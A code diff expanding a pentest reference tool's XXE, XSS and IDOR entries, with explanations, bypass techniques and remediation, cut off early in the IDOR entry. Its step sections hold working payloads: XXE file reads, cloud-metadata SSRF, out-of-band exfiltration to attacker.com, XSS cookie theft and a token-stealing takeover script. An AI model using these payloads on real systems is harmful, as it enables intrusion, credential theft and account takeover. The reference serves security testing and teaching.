@@ -823,23 +823,63 @@ var VULNS = [
         severity: "High",
         ref: "https://portswigger.net/web-security/xxe",
         description: "An XML parser processes attacker-defined external entities, enabling file read, SSRF, and sometimes RCE.",
-        brief: "XXE arises when an application parses XML that permits external entity definitions and does not disable them. An attacker defines an entity pointing at a local file or internal URL; when the parser expands it, the contents are pulled into the response or sent to a server the attacker controls.\n\nImpact: local file disclosure (source, config, keys), SSRF to internal services and cloud metadata, denial of service, and occasionally RCE. Any XML input is a candidate — SOAP, SAML, and document uploads (DOCX/SVG/XLSX).",
+        brief: "XML External Entity injection arises when an application parses XML input with a parser that still permits Document Type Definitions (DTDs) and external entity resolution — behaviour that is on by default in many older parsers. XML lets a document define entities, which are like variables, and an external entity can point at a URI: a local file (file://), an internal HTTP endpoint (http://), or another DTD. When the parser expands the entity during parsing, it fetches that resource and either substitutes the content into the document (which may then be reflected) or, for blind cases, makes a request the attacker can observe out-of-band.\n\nThat single capability yields a wide impact surface. Pointing an entity at file:///etc/passwd reads local files (source code, config, private keys, /etc/shadow if privileged). Pointing it at http://169.254.169.254/ or an internal service turns the parser into an SSRF primitive — reaching cloud metadata to steal credentials, or internal-only APIs. Deeply nested entities (the 'Billion Laughs' attack) exhaust memory for denial of service. On specific stacks (e.g. PHP with the expect:// wrapper, or Java with certain configurations) XXE can even reach code execution.\n\nAny XML input is a candidate, and much XML is invisible: SOAP web services, SAML authentication assertions, RSS/XML-RPC, sitemap uploads, and — crucially — the many file formats that are XML underneath (SVG images, DOCX/XLSX/PPTX Office files). A document upload that is 'just an image' can carry an XXE payload if the server parses its embedded XML.",
         quickReference: [
           { label: "Classic file read", cmd: "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>" },
-          { label: "SSRF via entity", cmd: "<!ENTITY x SYSTEM \"http://169.254.169.254/latest/meta-data/\">" },
-          { label: "Blind OOB (external DTD)", cmd: "<!ENTITY % x SYSTEM \"http://attacker/evil.dtd\">" },
-          { label: "Where to inject", cmd: "Any XML body, SVG/DOCX/XLSX upload, SAML, SOAP" }
+          { label: "SSRF / cloud metadata", cmd: "<!ENTITY x SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">" },
+          { label: "Blind OOB (external DTD)", cmd: "<!DOCTYPE r [<!ENTITY % x SYSTEM \"http://attacker/evil.dtd\"> %x;]>" },
+          { label: "Where to inject", cmd: "Any XML body, SOAP, SAML, RSS, and SVG/DOCX/XLSX uploads" }
         ],
         sections: [
           {
-            title: "How It's Exploited",
+            title: "Root Cause & Mechanism",
+            type: "notes",
+            items: [
+              "XML parsers historically resolve DTDs and external entities by default; if the app does not explicitly disable them, attacker-defined entities are fetched and expanded during parse.",
+              "A general entity (&x;) substitutes into the document body — used for in-band file read where the value is reflected. A parameter entity (%x;) is used inside the DTD itself — required for blind exfiltration because general entities cannot be used within the DTD's markup.",
+              "The parser, not the app, performs the fetch, so it runs with the server's network position and privileges — which is exactly what makes XXE such a strong SSRF and file-read primitive.",
+              "'Blind' XXE means the entity's content is never reflected; you recover data by having the malicious external DTD build a URL containing the file contents and requesting it from your server (out-of-band).",
+              "Many stacks disable inline DOCTYPEs but still fetch external DTDs, or block file:// but allow http:// — so test SSRF even when file read is blocked."
+            ]
+          },
+          {
+            title: "Where to Look",
+            type: "notes",
+            items: [
+              "Explicit XML APIs: any endpoint whose Content-Type is application/xml or text/xml, and any SOAP service.",
+              "SAML single sign-on: the SAMLResponse is base64-encoded XML parsed server-side — a classic, high-value XXE (and signature-wrapping) target.",
+              "File uploads that are XML underneath: .svg (parsed by image processors / rendered inline), .docx/.xlsx/.pptx (zipped XML), .xml sitemaps, .rss/.atom feeds, GPX/KML, SVG-in-PDF.",
+              "APIs that accept both JSON and XML — flip the Content-Type to text/xml and add a body to reach the XML code path even where the UI only sends JSON.",
+              "SVG rendered on the server (thumbnailing, PDF export) is a common blind-XXE sink even when there is no obvious XML field."
+            ]
+          },
+          {
+            title: "Step 1 — Confirm the Parser Resolves Entities",
             type: "commands",
             commands: [
-              { label: "1. In-band file read", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root><data>&xxe;</data></root>\n# the file contents appear where &xxe; is reflected" },
-              { label: "2. SSRF — reach internal services / cloud metadata", cmd: "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]>\n<root>&xxe;</root>   # returns IAM creds in AWS" },
-              { label: "3. Blind (no reflection) — exfil via an external DTD", cmd: "# host evil.dtd on your server:\n#   <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n#   <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?x=%file;'>\">\n#   %eval; %exfil;\n# payload:\n<!DOCTYPE r [<!ENTITY % x SYSTEM \"http://attacker/evil.dtd\"> %x;]>" },
-              { label: "4. File uploads that are XML underneath", cmd: "# SVG, DOCX, XLSX are XML -> embed the DOCTYPE/entity in the file's XML and upload\n# e.g. a malicious .svg processed server-side leaks files" },
-              { label: "5. Confirm blind with an OOB callback", cmd: "<!DOCTYPE r [<!ENTITY x SYSTEM \"http://YOUR-COLLAB.oastify.com\">]><r>&x;</r>\n# a hit proves the parser fetches external entities" }
+              { label: "Harmless internal-entity echo", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE r [<!ENTITY test \"XXE-WORKS\">]>\n<r>&test;</r>\n# if the response reflects XXE-WORKS, entity expansion is enabled" },
+              { label: "OOB probe (works even when blind)", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE r [<!ENTITY x SYSTEM \"http://YOURID.oast.site\">]>\n<r>&x;</r>\n# a DNS/HTTP hit on your listener proves external fetch\n# (use interactsh / Burp Collaborator)" },
+              { label: "Flip a JSON endpoint to XML", cmd: "# change Content-Type: application/json  ->  application/xml\n# and send an XML body; many frameworks parse whichever you send" }
+            ]
+          },
+          {
+            title: "Step 2 — Exploit: File Read & SSRF",
+            type: "commands",
+            commands: [
+              { label: "In-band local file read", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root><data>&xxe;</data></root>\n# the file appears where &xxe; is reflected" },
+              { label: "PHP wrapper for files with special chars", cmd: "# base64-wrap so XML-breaking characters survive:\n<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/var/www/config.php\">\n# then base64-decode the reflected value" },
+              { label: "SSRF to internal services / cloud metadata", cmd: "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]>\n<root>&xxe;</root>\n# also try http://localhost:port/ internal admin and Azure/GCP metadata (with header caveats)" },
+              { label: "Windows targets", cmd: "<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">\n# UNC path can also trigger NTLM auth to your host (credential capture)" }
+            ]
+          },
+          {
+            title: "Step 3 — Blind XXE (Out-of-Band Exfiltration)",
+            type: "commands",
+            commands: [
+              { label: "Host this evil.dtd on your server", cmd: "<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>\">\n%eval;\n%exfil;" },
+              { label: "Send this payload to the target", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE r [<!ENTITY % x SYSTEM \"http://attacker.com/evil.dtd\"> %x;]>\n<r>test</r>\n# the target fetches evil.dtd, reads the file, and calls back to you with it base64-encoded in the query string" },
+              { label: "Error-based exfil (no outbound HTTP)", cmd: "# force the file content into a parser error message:\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>\">\n%eval; %err;\n# the 'no such file' error contains /etc/passwd's contents" },
+              { label: "Malicious SVG upload", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]>\n<svg xmlns=\"http://www.w3.org/2000/svg\"><text x=\"0\" y=\"20\">&xxe;</text></svg>\n# the rendered thumbnail shows the file contents" }
             ]
           },
           {
@@ -847,22 +887,24 @@ var VULNS = [
             type: "table",
             columns: ["Variant", "Detail"],
             rows: [
-              ["In-band read", "Entity contents appear in the response"],
-              ["Blind OOB", "Exfiltrate via an external DTD to your server"],
-              ["Error-based", "Provoke a parser error embedding the file contents"],
-              ["SSRF", "Point the entity at internal services / metadata"],
-              ["Billion Laughs (DoS)", "Nested entities expand exponentially"]
+              ["In-band read", "Entity contents are reflected directly in the response"],
+              ["Blind OOB", "Exfiltrate via an external DTD that calls back to your server"],
+              ["Error-based", "Provoke a parser error whose message embeds the file contents"],
+              ["SSRF", "Point the entity at internal services / cloud metadata"],
+              ["XInclude", "Inject <xi:include> when you control only part of the XML (no DOCTYPE)"],
+              ["Billion Laughs (DoS)", "Exponentially nested entities exhaust memory"]
             ]
           },
           {
-            title: "Attack Chain",
+            title: "Impact & Attack Chain",
             type: "table",
             columns: ["Step", "Action", "Result"],
             rows: [
-              ["1", "Find XML input (body/upload/SAML)", "Candidate parser"],
-              ["2", "Inject a benign entity / OOB probe", "Confirm external-entity processing"],
-              ["3", "Read files or reach internal URLs", "Secret disclosure / SSRF"],
-              ["4", "Chain SSRF to cloud metadata", "Credential theft → wider compromise"]
+              ["1", "Find XML input (body / upload / SAML)", "Candidate parser"],
+              ["2", "Confirm entity resolution (echo / OOB)", "External-entity processing verified"],
+              ["3", "Read local files", "Source, config, keys, credentials"],
+              ["4", "Pivot to SSRF -> cloud metadata", "Cloud IAM credential theft"],
+              ["5", "Use stolen creds / reach internal APIs", "Wider environment compromise"]
             ]
           },
           {
@@ -870,27 +912,32 @@ var VULNS = [
             type: "table",
             columns: ["Tool", "Purpose"],
             rows: [
-              ["Burp Suite (+ Collaborator)", "Manual injection and blind OOB detection"],
-              ["XXEinjector", "Automated file retrieval via XXE"],
-              ["oxml_xxe / docem", "Embed XXE into Office/SVG documents"]
+              ["Burp Suite + Collaborator", "Manual injection and blind OOB detection/exfiltration"],
+              ["XXEinjector", "Automated file retrieval and OOB exploitation"],
+              ["oxml_xxe / docem", "Embed XXE payloads into Office/SVG documents"],
+              ["interactsh", "Standalone OOB listener for blind confirmation"]
             ]
           },
           {
             title: "References",
             type: "references",
             items: [
-              { label: "PortSwigger — XXE injection", url: "https://portswigger.net/web-security/xxe" },
-              { label: "OWASP — XXE Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" }
+              { label: "PortSwigger — XXE injection (with labs)", url: "https://portswigger.net/web-security/xxe" },
+              { label: "OWASP — XXE Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" },
+              { label: "OWASP WSTG — Testing for XML Injection", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection" },
+              { label: "PayloadsAllTheThings — XXE Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Disable external entity and DTD processing in the XML parser — the definitive fix, usually one flag.",
-              "Prefer JSON where XML is not required; patch and harden the XML library (defaults vary).",
-              "Validate/sanitise uploaded XML-based files (SVG, Office documents) before parsing.",
-              "Apply least privilege and egress controls so a successful XXE reads little and reaches nothing internal."
+              "Disable DTDs and external entity resolution in the parser — the definitive fix. Java: factory.setFeature('http://apache.org/xml/features/disallow-doctype-decl', true). .NET: XmlReaderSettings.DtdProcessing = Prohibit. PHP (libxml < 2.9): libxml_disable_entity_loader(true). Python: use defusedxml instead of the stdlib parsers.",
+              "Turn off external general and parameter entities and external DTD loading explicitly (setFeature external-general-entities / external-parameter-entities = false) as belt-and-braces.",
+              "Prefer JSON or a hardened, DTD-free parser where XML is not strictly required; keep XML libraries patched, as safe defaults vary by version.",
+              "Validate and sandbox uploaded XML-based files (SVG, Office documents) before any server-side parsing/rendering, and process images with libraries configured to ignore embedded XML.",
+              "Apply least privilege to the app account and enforce egress filtering so a successful XXE reads little of value and cannot reach internal services or metadata endpoints.",
+              "For SAML specifically, use a vetted library with entity resolution disabled and signature validation done correctly (see SAML Authentication Flaws)."
             ]
           }
         ]
@@ -983,45 +1030,115 @@ var VULNS = [
         severity: "High",
         ref: "https://portswigger.net/web-security/cross-site-scripting",
         description: "Attacker-controlled script executes in another user's browser, stealing sessions and acting as the victim.",
-        brief: "XSS occurs when an application includes untrusted data in a page without correct encoding, so the browser executes it as script. The attacker's JavaScript then runs in the victim's session — reading cookies and tokens, making authenticated requests, keylogging, or rewriting the page.\n\nImpact: session hijacking, account takeover, credential theft, and full control of the victim's interaction with the site. It is the most widespread web vulnerability class; the fix everywhere is the same principle — encode on output, in the correct context.",
+        brief: "Cross-Site Scripting occurs when an application places untrusted data into a page (or into client-side JavaScript) without encoding it for the context it lands in, so the browser parses the attacker's data as executable script instead of inert text. The injected JavaScript then runs inside the victim's origin, with full access to everything that origin can do: reading non-HttpOnly cookies and tokens, making authenticated same-origin requests as the victim, reading the DOM, keylogging, phishing via injected UI, and rewriting the page.\n\nXSS comes in three delivery modes. Reflected XSS echoes the payload straight back from the request into the response, so it is delivered by luring the victim to a crafted link. Stored (persistent) XSS saves the payload server-side (a comment, profile field, filename, support ticket) and fires for every user who views it — the most dangerous because it needs no lure and often hits admins. DOM-based XSS never involves the server reflecting anything: client-side JavaScript reads a source it controls (location.hash, location.search, postMessage) and writes it into a dangerous sink (innerHTML, document.write, eval). A stored payload that fires somewhere you cannot see (an admin dashboard, a log viewer) is blind XSS, caught with an out-of-band callback.\n\nThe single most important concept is context: the same input is safe in one place and dangerous in another, and the payload that works depends entirely on where the reflection lands (HTML body, tag attribute, inside <script>, inside a URL, inside a CSS block). The universal fix is the same principle everywhere — encode on output for the exact context, and prefer safe sinks over dangerous ones. Impact runs from nuisance to full account takeover and, chained with CSRF or admin functionality, to site-wide compromise.",
         quickReference: [
-          { label: "Reflected probe", cmd: "<script>alert(document.domain)</script>" },
-          { label: "Attribute / tag break-out", cmd: "\"><img src=x onerror=alert(1)>     '-alert(1)-'" },
-          { label: "No-script vectors", cmd: "<svg onload=alert(1)>   <img src=x onerror=alert(1)>   <body onpageshow=alert(1)>" },
-          { label: "Session theft (concept)", cmd: "<script>fetch('//attacker/?c='+document.cookie)</script>" }
+          { label: "Reflected probe", cmd: "<script>alert(document.domain)</script>   \"><img src=x onerror=alert(1)>" },
+          { label: "Attribute / string break-out", cmd: "\"><svg onload=alert(1)>     ';alert(1)//     '-alert(1)-'" },
+          { label: "No-script / filtered vectors", cmd: "<svg onload=alert(1)>   <img src=x onerror=alert(1)>   <details open ontoggle=alert(1)>" },
+          { label: "Session theft (concept)", cmd: "<script>new Image().src='//atk/?c='+document.cookie</script>" }
         ],
         sections: [
           {
-            title: "How It's Exploited",
+            title: "Root Cause & Mechanism",
+            type: "notes",
+            items: [
+              "The browser decides whether bytes are code or content based on where they sit in the document. XSS happens when attacker data crosses from a data position into a code position because the app failed to encode it for that spot.",
+              "Correct defence is context-aware output encoding: HTML-entity-encode in HTML text, attribute-encode (and quote) in attributes, JavaScript-string-encode inside <script>, URL-encode in URL components, and CSS-encode in style. One encoding does not fit all contexts.",
+              "DOM XSS is a client-side variant: no server encoding can fix it because the unsafe write happens in the browser — it is fixed by using safe DOM APIs (textContent, setAttribute) instead of sinks (innerHTML, document.write, eval, setTimeout(string)).",
+              "HttpOnly stops script reading a cookie but does NOT stop XSS — the attacker can still ride the session with same-origin fetch/XHR, so HttpOnly limits one impact, not the vulnerability.",
+              "mXSS (mutation XSS) exploits the browser re-parsing sanitised HTML after DOM insertion, turning inert markup into live script — which is why home-grown sanitisers fail and DOMPurify exists."
+            ]
+          },
+          {
+            title: "Where to Look",
+            type: "notes",
+            items: [
+              "Every reflected input: search boxes, error messages, query parameters echoed into the page, and 'you searched for X' banners (reflected).",
+              "Every stored/displayed field: comments, usernames and display names, profile bios, addresses, message bodies, filenames of uploads, support tickets, and anything an admin later views (stored / blind).",
+              "Client-side sinks: grep the JS for innerHTML, outerHTML, document.write, insertAdjacentHTML, eval, Function(), setTimeout/setInterval with strings, jQuery .html()/.append(), and location assignments fed from location.hash/search or postMessage (DOM).",
+              "Non-obvious sinks: SVG/HTML file uploads served inline, Markdown renderers, PDF/HTML export, custom email templates, and JSON reflected into a <script> block.",
+              "Header/less-common reflections: Referer, User-Agent, and custom headers echoed into error or admin pages."
+            ]
+          },
+          {
+            title: "Step 1 — Find the Reflection & Its Context",
             type: "commands",
             commands: [
-              { label: "1. Inject a unique marker and find the reflection", cmd: "# reflect a harmless string and locate where/how it appears\nq=xss7411test\n# search the response and DOM: is it in HTML body, an attribute, a <script>, or written by JS?" },
-              { label: "2. Identify the context — it dictates the payload", cmd: "# HTML body     -> inject a tag:        <svg onload=alert(1)>\n# HTML attribute -> close it first:      \"><svg onload=alert(1)>\n# inside <script>-> break the string:    ';alert(1)//\n# href / URL     -> scheme:              javascript:alert(1)" },
-              { label: "3. Adapt to filters", cmd: "# test which of  < > \" ' / ( )  are blocked or encoded, then bypass:\n<sVg OnLoad=alert(1)>              # case / tag variation\n<img src=x onerror=alert`1`>       # no parentheses (backticks)\n<svg onload=alert(1) //           # break malformed sanitisers" },
-              { label: "4. DOM XSS — trace source to sink", cmd: "# user-controlled source flows into a dangerous sink client-side\nlocation.hash / location.search  ->  innerHTML / document.write / eval\n# example sink:  el.innerHTML = location.hash.slice(1)\n# payload:  #<img src=x onerror=alert(1)>   (often never reaches the server)" },
-              { label: "5. Weaponise — steal the session / act as the victim", cmd: "# exfiltrate the cookie (if not HttpOnly):\n<script>new Image().src='//attacker/?c='+document.cookie</script>\n# or ride the session directly with a same-origin request:\n<script>fetch('/account/email',{method:'POST',body:'email=attacker@evil',credentials:'include'})</script>\n# blind/stored XSS: plant a callback payload where an admin will view it (XSS Hunter)" }
+              { label: "Inject a unique marker", cmd: "# a distinctive, harmless token you can grep for in the response and DOM\nq=xz9k7qmarker\n# note EVERY place it appears and HOW it is encoded there" },
+              { label: "Classify the context", cmd: "HTML body        <div>MARKER</div>          -> inject a tag\nAttribute (quoted) value=\"MARKER\"           -> close the quote/tag: \">\nAttribute (unquoted) value=MARKER           -> add an event handler with a space\nInside <script>  var x='MARKER';            -> break the string: ';payload//\nURL / href       href=\"MARKER\"              -> javascript: scheme\nCSS              style=\"...MARKER...\"        -> expression / url() vectors" },
+              { label: "See what survives encoding", cmd: "# submit  <>\"'`  and check which come back raw vs entity-encoded\n# raw < and > in HTML body = tag injection likely works\n# only \" encoded but ' raw in a single-quoted attr = still exploitable" },
+              { label: "Reflected vs DOM", cmd: "# if the marker is in the raw HTTP response -> server-side reflection\n# if it appears only after JS runs (view source clean, DOM dirty) -> DOM XSS" }
             ]
           },
           {
-            title: "Types",
+            title: "Step 2 — Payloads by Context",
             type: "table",
-            columns: ["Type", "Where it lives"],
+            columns: ["Context", "Payload"],
             rows: [
-              ["Reflected", "Payload is in the request and echoed straight back — delivered via a crafted link"],
-              ["Stored", "Payload is saved (comment, profile, message) and fires for every viewer — the most dangerous"],
-              ["DOM-based", "Client-side JS writes attacker input into a dangerous sink; the server may never see it"],
-              ["Blind", "Stored XSS that fires somewhere you cannot see (admin panel, logs) — catch with an OOB callback"]
+              ["HTML body", "<svg onload=alert(document.domain)>  /  <img src=x onerror=alert(1)>"],
+              ["Quoted attribute", "\"><svg onload=alert(1)>  (break out first)"],
+              ["Unquoted attribute", "x onmouseover=alert(1)  (a space starts a new attribute)"],
+              ["Inside <script> string", "';alert(1)//   or   </script><svg onload=alert(1)>"],
+              ["href / src (URL)", "javascript:alert(document.domain)"],
+              ["Event-handler attribute", "already in JS context: alert(1)  (may need HTML-decode)"],
+              ["JS template / JSON in script", "</script> break-out, or Unicode/backtick escapes"],
+              ["AngularJS sandbox (ng-app)", "{{constructor.constructor('alert(1)')()}}"]
             ]
           },
           {
-            title: "Attack Chain",
+            title: "Step 3 — Filter & WAF Bypass",
+            type: "commands",
+            commands: [
+              { label: "When <script> is blocked", cmd: "# event handlers on other tags need no <script>:\n<svg onload=alert(1)>\n<img src=x onerror=alert(1)>\n<body onpageshow=alert(1)>\n<details open ontoggle=alert(1)>\n<input autofocus onfocus=alert(1)>" },
+              { label: "When parentheses / quotes are filtered", cmd: "# backticks call functions:  alert`1`\n# no quotes: use String.fromCharCode or /regex/.source or template literals\n# throw/onerror trick:  <img src=x onerror=alert`1`>\nonerror=alert;throw 1                       # arg-less call via throw" },
+              { label: "Case, encoding & obfuscation", cmd: "<sCrIpT>alert(1)</sCrIpT>                  # tags are case-insensitive\n# HTML entities in attributes are decoded before JS runs:\n<a href=\"javas&#99;ript:alert(1)\">\n# double URL-encoding / overlong UTF-8 to slip a WAF that decodes late\n# eval(atob('...')) to hide the payload body" },
+              { label: "Break naive sanitisers", cmd: "# incomplete tag stripping — nest so removal creates a live tag:\n<scr<script>ipt>alert(1)</scr</script>ipt>\n<<script>alert(1)//<</script>\n# mXSS: markup that mutates into script when re-parsed (use DOMPurify to defend)" }
+            ]
+          },
+          {
+            title: "DOM XSS — Sources & Sinks",
+            type: "table",
+            columns: ["Sources (attacker-controlled)", "Dangerous sinks (execution)"],
+            rows: [
+              ["location.hash / .search / .href", "element.innerHTML / outerHTML"],
+              ["document.referrer", "document.write / writeln"],
+              ["window.name", "eval / Function / setTimeout(string)"],
+              ["postMessage event.data", "element.insertAdjacentHTML"],
+              ["localStorage / sessionStorage", "jQuery $().html() / $($input)"],
+              ["URL fragment params", "location = / location.href = (javascript:)"]
+            ]
+          },
+          {
+            title: "Step 4 — Weaponise",
+            type: "commands",
+            commands: [
+              { label: "Steal a non-HttpOnly cookie", cmd: "<script>new Image().src='//attacker.com/?c='+encodeURIComponent(document.cookie)</script>\n<script>fetch('//attacker.com/?c='+document.cookie)</script>" },
+              { label: "Ride the session (works with HttpOnly)", cmd: "// perform an authenticated action as the victim, same-origin:\n<script>fetch('/account/email',{method:'POST',credentials:'include',\n  headers:{'Content-Type':'application/x-www-form-urlencoded'},\n  body:'email=attacker@evil.com'})</script>\n// often chained: change email -> trigger password reset -> takeover" },
+              { label: "Steal a CSRF token then submit", cmd: "<script>fetch('/account').then(r=>r.text()).then(h=>{\n  const t=h.match(/csrf\" value=\"([^\"]+)/)[1];\n  fetch('/account/email',{method:'POST',credentials:'include',\n    body:'csrf='+t+'&email=attacker@evil.com'});})</script>" },
+              { label: "Blind XSS beacon", cmd: "# plant where an admin will render it (support ticket, user-agent, feedback):\n\"><script src=//xss.report/c/yourid></script>\n# the callback tells you where it fired, with cookies/DOM/screenshot" }
+            ]
+          },
+          {
+            title: "Bypassing CSP",
+            type: "notes",
+            items: [
+              "A CSP only mitigates XSS — a weak policy still allows it. Look for unsafe-inline (inline handlers/scripts run), unsafe-eval (eval works), or a wildcard/overbroad script-src.",
+              "Allow-listed CDNs that host JSONP endpoints or vulnerable libraries (AngularJS, older jQuery) let you load approved-but-abusable script.",
+              "'strict-dynamic' with a leaked or predictable nonce, or a nonce reused across responses, can be abused.",
+              "Missing base-uri lets a <base> tag hijack relative script loads; missing object-src allows plugin vectors.",
+              "Report the CSP weakness alongside the XSS — a robust policy (nonce/hash-based, no unsafe-inline) is a key part of the fix."
+            ]
+          },
+          {
+            title: "Impact & Attack Chain",
             type: "table",
             columns: ["Step", "Action", "Result"],
             rows: [
-              ["1", "Reflect a marker, find where it lands", "Injection point + context"],
-              ["2", "Craft a context-appropriate payload", "Script executes in the browser"],
-              ["3", "Deliver to the victim (link or stored)", "Runs in the victim's session"],
-              ["4", "Steal cookies / make authenticated requests", "Session hijack / account takeover"]
+              ["1", "Reflect a marker, identify the context", "Injection point + the payload it needs"],
+              ["2", "Craft a context-appropriate payload, bypass filters", "Script executes in the browser"],
+              ["3", "Deliver (crafted link, or store it)", "Runs in the victim's authenticated session"],
+              ["4", "Steal session / perform actions / read data", "Session hijack, account takeover"],
+              ["5", "Target an admin (stored/blind)", "Privileged actions, site-wide compromise"]
             ]
           },
           {
@@ -1029,18 +1146,21 @@ var VULNS = [
             type: "table",
             columns: ["Tool", "Purpose"],
             rows: [
-              ["Burp Suite (+ DOM Invader)", "Manual probing, context analysis, DOM-XSS discovery"],
-              ["dalfox", "Automated XSS scanning and parameter analysis"],
-              ["XSS Hunter / Interactsh", "Blind XSS callbacks and out-of-band confirmation"],
-              ["DOMPurify (defence)", "Reference sanitiser for safe rich HTML"]
+              ["Burp Suite + DOM Invader", "Manual probing, context analysis, automated DOM-XSS source/sink tracing"],
+              ["dalfox", "Fast automated XSS scanning, parameter analysis, and payload generation"],
+              ["XSS Hunter / ezXSS", "Blind XSS callbacks with DOM, cookies, and screenshots"],
+              ["kxss / Gxss", "Find reflected parameters and which special chars survive"],
+              ["DOMPurify (defence)", "Reference client-side sanitiser for safe rich HTML"]
             ]
           },
           {
             title: "References",
             type: "references",
             items: [
-              { label: "PortSwigger — Cross-site scripting", url: "https://portswigger.net/web-security/cross-site-scripting" },
+              { label: "PortSwigger — Cross-site scripting (with labs)", url: "https://portswigger.net/web-security/cross-site-scripting" },
               { label: "OWASP — XSS Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
+              { label: "OWASP — DOM-based XSS Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html" },
+              { label: "PortSwigger — XSS cheat sheet (interactive)", url: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" },
               { label: "PayloadsAllTheThings — XSS Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" }
             ]
           },
@@ -1048,11 +1168,12 @@ var VULNS = [
             title: "Remediation",
             type: "notes",
             items: [
-              "Context-aware output encoding is the core fix — HTML-encode in HTML, JS-encode in scripts, URL-encode in URLs. Use the framework's auto-escaping and do not disable it.",
-              "Avoid dangerous DOM sinks (innerHTML, document.write, eval); use textContent and safe APIs, or a sanitiser like DOMPurify for rich HTML.",
-              "Deploy a strong Content-Security-Policy as defense-in-depth — it limits impact when encoding is missed.",
-              "Set HttpOnly on session cookies so script cannot read them, and SameSite to blunt cross-site delivery.",
-              "Validate input on the way in, but never rely on input filtering alone — encoding on output is what prevents XSS."
+              "Context-aware output encoding is the core fix: HTML-encode in HTML text, attribute-encode inside quoted attributes, JavaScript-encode inside scripts, URL-encode in URL parameters. Use your framework's auto-escaping (React JSX, Angular, Razor, Thymeleaf) and never disable it or use raw/bypass APIs (dangerouslySetInnerHTML, |safe, [innerHTML]) on untrusted data.",
+              "Eliminate dangerous DOM sinks: use textContent/innerText and setAttribute instead of innerHTML/document.write/eval; if you must render rich HTML, sanitise it with DOMPurify and nothing home-grown.",
+              "Deploy a strict, nonce- or hash-based Content-Security-Policy with no unsafe-inline and no unsafe-eval as defence-in-depth so a single missed encoding is not instantly exploitable.",
+              "Set HttpOnly and SameSite on session cookies — HttpOnly stops cookie theft (not the XSS itself) and SameSite blunts cross-site delivery of reflected payloads.",
+              "For file uploads that could be HTML/SVG, serve them from a separate origin with Content-Disposition: attachment and a non-HTML content type so they cannot execute in the app's origin.",
+              "Validate input on the way in as defence-in-depth, but never rely on input filtering alone — output encoding for the correct context is what actually prevents XSS."
             ]
           }
         ]
@@ -1697,23 +1818,63 @@ var VULNS = [
         severity: "High",
         ref: "https://portswigger.net/web-security/access-control",
         description: "The app trusts a client-supplied identifier without checking ownership, exposing other users' data or actions.",
-        brief: "Broken access control is the most common serious web weakness, and IDOR (Insecure Direct Object Reference) is its signature form: an endpoint accepts an object identifier — a user ID, order number, document GUID — and returns or modifies that object without verifying the requester is authorised for it. Change the ID, get someone else's data.\n\nImpact: mass exposure of other users' records, cross-account takeover, and privilege escalation into admin functionality. The root cause is authorising on what the client sends rather than on the authenticated identity.",
+        brief: "Broken access control is consistently the most prevalent serious web weakness (OWASP Top 10 #1), and IDOR — Insecure Direct Object Reference — is its signature form. An IDOR exists when an endpoint takes a reference to an object (a user id, order number, document GUID, filename) directly from the client and then reads or modifies that object without checking that the authenticated user is actually authorised for it. The classic proof is trivial: change the id in the request from yours to someone else's and receive their data.\n\nIt helps to name the two axes. Object-level (horizontal) access control decides whether you may touch THIS specific record; its failure is the textbook IDOR — /account/1001 returning 1002's data. Function-level (vertical) access control decides whether your role may perform THIS action at all; its failure is a normal user reaching an admin-only endpoint the UI merely hid. Related failures include mass-assignment-style parameter trust (the server believing a client-sent role=admin or userId), and multi-step flows where the authorisation check lives on a step you can skip.\n\nThe common root cause is authorising on what the client sends (an id, a role flag, a hidden field) instead of on the server-side authenticated identity. Because it is pure application logic, automated scanners miss most of it — it is found by testing with real accounts and swapping references. Impact is severe and immediate: bulk exfiltration of other users' records by enumerating ids, cross-account takeover (change someone else's email/password), reading or altering financial and PII data, and escalation into administrative functionality.",
         quickReference: [
           { label: "Horizontal IDOR", cmd: "GET /api/account/1001  ->  change to 1002" },
-          { label: "Method / function abuse", cmd: "POST /api/user/1002/role  as a normal user" },
-          { label: "Guess/enumerate identifiers", cmd: "Sequential IDs, predictable GUIDs, base64'd IDs in cookies/params" },
-          { label: "Force-browse admin paths", cmd: "/admin, /api/internal, hidden endpoints from JS/archives" }
+          { label: "Function-level abuse", cmd: "PUT /api/user/1002/role {\"role\":\"admin\"}  as a normal user" },
